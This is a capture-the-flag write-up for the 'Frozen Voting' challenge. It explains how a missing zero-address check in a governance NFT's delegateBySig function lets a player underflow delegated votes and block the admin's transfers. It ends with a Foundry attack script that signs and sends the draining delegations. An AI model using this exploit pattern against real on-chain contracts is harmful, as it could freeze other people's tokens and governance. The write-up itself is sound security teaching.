# FROZEN VOTING: Breaking Delegation

In this CTF challenge, we explore a vulnerability in a delegation function of governance token. This challenge demonstrates how the delegation functionality of the governance token can lead to a DoS attack.

## Challenge Overview

The challenge presents us with the following contents:
- Players receive a voting NFT with `NORMAL_POWER` (1e18) voting rights.
- The admin receives a voting NFT with `SUPER_POWER` (1000e18) voting rights.
- The admin delegates the voting power of their voting NFT to a player.
- The main goal is to cause revert the admin from transferring their voting NFT or redelegating its voting power to someone else.

## Initial Code Analysis

Let's examine the core mechanics and key components in detail.

## Delegation Logic
Whenever a voting NFT is transferred, delegated, or redelegated, the `_delegate()` function is always called. The `_moveDelegates()` function, which is called within `_delegate()`, subtracts the voting power from the previous delegatee (if there was one) and assigns it to the new delegatee.

```solidity
function _moveDelegates(address srcRep, address dstRep, uint256 amount) internal {
	if (srcRep != dstRep && amount > 0) {
	    if (srcRep != address(0)) {
	        uint256 srcRepNum = numCheckpoints[srcRep];
	        uint256 srcRepOld = srcRepNum > 0 ? checkpoints[srcRep][srcRepNum - 1].votes : 0;
	        uint256 srcRepNew = srcRepOld - amount; // this point
	        _writeCheckpoint(srcRep, srcRepNum, srcRepOld, srcRepNew);
	    }

	    if (dstRep != address(0)) {
	        uint256 dstRepNum = numCheckpoints[dstRep];
	        uint256 dstRepOld = dstRepNum > 0 ? checkpoints[dstRep][dstRepNum - 1].votes : 0;

	        uint256 dstRepNew = dstRepOld + amount;

	        _writeCheckpoint(dstRep, dstRepNum, dstRepOld, dstRepNew);
	    }
	}
}
```

From this, we can see that, in order to achieve our main goal of causing a DoS, we need to trigger an underflow when subtracting the delegatee’s voting power.

## Finding the Vulnerability

To trigger an underflow when subtracting delegated voting power, the player’s voting power must be less than `SUPER_POWER`. To find a path to achieve this, we analyzed other functions in the `VotingERC721` contract. As a result, we discovered that the `delegateBySig()` function behaves differently from the `delegate()` function, even though it is supposed to provide the same functionality.

```solidity
function delegate(address delegatee) public {
    if (delegatee == address(0)) delegatee = msg.sender;
    return _delegate(msg.sender, delegatee);
}
```

The `delegate()` function assigns `msg.sender` as the `delegatee` if `delegatee` is `address(0)`. However, in `delegateBySig()`, the `if (delegatee == address(0)) delegatee = msg.sender;` is missing.

When a player calls `delegateBySig()`, if `delegatee` is `address(0)`, the following happens in `_delegate()`:

1. In `_moveDelegates()`, `srcRep` is the player, so the player’s voting power is reduced.
2. In `_moveDelegates()`, `dstRep` is `address(0)`, meaning that no one’s voting power increases.

As a result, by repeating this process, we can decrease the player’s voting power to be less than `SUPER_POWER`.

## Complete Solution

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import "../src/Challenge.sol";

contract AttackScript is Script {
    Challenge public chall;
    address public challenge_address = ;
    uint256 public player_privatekey = ;

    function setUp() public {
        chall = new Challenge(challenge_address);
    }

    function run() public {
        vm.startBroadcast(player_privatekey);
        bytes32 domainSeparator = keccak256(
            abi.encode(token.DOMAIN_TYPEHASH(), keccak256(bytes(token.name())), block.chainid, address(token))
        );
        bytes32 structHash =
            keccak256(abi.encode(token.DELEGATION_TYPEHASH(), address(0), uint256(0), uint256(type(uint256).max)));
        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", domainSeparator, structHash));
        (uint8 v, bytes32 r, bytes32 s) =
            vm.sign(player_privatekey, digest);

        token.delegateBySig(address(0), 0, type(uint256).max, v, r, s);

        domainSeparator = keccak256(
            abi.encode(token.DOMAIN_TYPEHASH(), keccak256(bytes(token.name())), block.chainid, address(token))
        );
        structHash =
            keccak256(abi.encode(token.DELEGATION_TYPEHASH(), address(0), uint256(1), uint256(type(uint256).max)));
        digest = keccak256(abi.encodePacked("\x19\x01", domainSeparator, structHash));
        (v, r, s) =
            vm.sign(player_privatekey, digest);

        token.delegateBySig(address(0), 1, type(uint256).max, v, r, s);

        console.log(chall.isSolved());
        vm.stopBroadcast();
    }
}
```